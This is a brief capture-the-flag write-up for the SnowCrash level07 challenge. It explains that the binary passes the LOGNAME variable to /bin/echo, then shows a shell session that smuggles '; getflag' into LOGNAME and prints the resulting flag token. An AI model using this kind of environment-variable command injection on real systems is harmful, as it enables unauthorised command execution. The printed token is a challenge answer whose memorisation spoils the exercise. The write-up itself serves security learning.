by decompile the level07 file in ghidra 
we can see that the script is calling 
/bin/echo with the LOGNAME environment variable
so we can inject a command in the LOGNAME variable

level07@SnowCrash:~$ export LOGNAME="; getflag"

level07@SnowCrash:~$ ./level07 

Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
